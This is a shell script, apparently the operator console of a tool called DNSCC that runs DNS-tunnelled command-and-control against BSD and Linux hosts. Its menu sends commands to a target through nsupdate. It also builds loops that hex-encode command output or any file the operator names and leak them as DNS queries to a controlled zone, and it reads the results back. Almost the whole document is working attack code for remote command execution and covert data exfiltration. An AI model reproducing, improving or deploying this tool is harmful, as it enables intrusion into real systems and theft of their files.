#!/bin/sh
source ./config
target='BSD'
clear
com=0
echo 'Welcome to DNSCC!'
echo 'The following commands are available:'
while [ $com -lt 6 ] ; do
echo '1. Send command to target'
echo '2. Get file from target'
echo '3. Read output from target'
echo '4. Read output from target and pipe to more'
echo '5. Change type of host - Current host is type:' $target
echo '6. Exit'
echo 'Enter the number:'
read com
if [ $com -eq 1 ]; then 
	echo 'Enter command'
	read c
	if [ $target = "BSD" ]; then
		echo 'for b in `'$c' | xxd -p`; do drill +short $b.'$zone'; done' > c.txt
		./send.sh c.txt | nsupdate
	elif [ $target = "Linux" ]; then
		echo 'for b in `'$c' | xxd -p`; do dig +short $b.'$zone'; done' > c.txt
		./send.sh c.txt | nsupdate
	elif [ $target = "Windows" ]; then
		echo 'Not implemented yet!' 
	fi	 

elif [ $com -eq 2 ]; then
        echo 'Enter Path of File'
        read c
        if [ $target = "BSD" ]; then

		echo 'for b in `xxd -p '$c'`; do drill +short $b.'$zone'; done' > c.txt
        	./send.sh c.txt | nsupdate

	elif [ $target = "Linux" ]; then
                echo 'for b in `xxd -p '$c'`; do dig +short $b.'$zone'.local; done' > c.txt
        	./send.sh c.txt | nsupdate

	elif [ $target = "Windows" ]; then
                echo 'Not implemented yet!'
        fi


elif [ $com -eq 3 ]; then
	./read.sh|tail -100 
elif [ $com -eq 4 ]; then
       ./read.sh|more 
elif [ $com -eq 5 ]; then
        echo '(L)inux' 
        echo '(B)SD' 
	echo '(W)indows'
	echo 'Enter letter for targer system'
	read t
	if [ $t = "L" ]; then
		echo 'Target set to Linux'
		target="Linux"

	elif [ $t = "B" ]; then
		echo 'Target set to BSD'
		target="BSD"

	elif [ $t = "W" ]; then
		echo 'Target set to Windows, but batch needs to be written still'
		target="Windows"

	fi	
fi


done
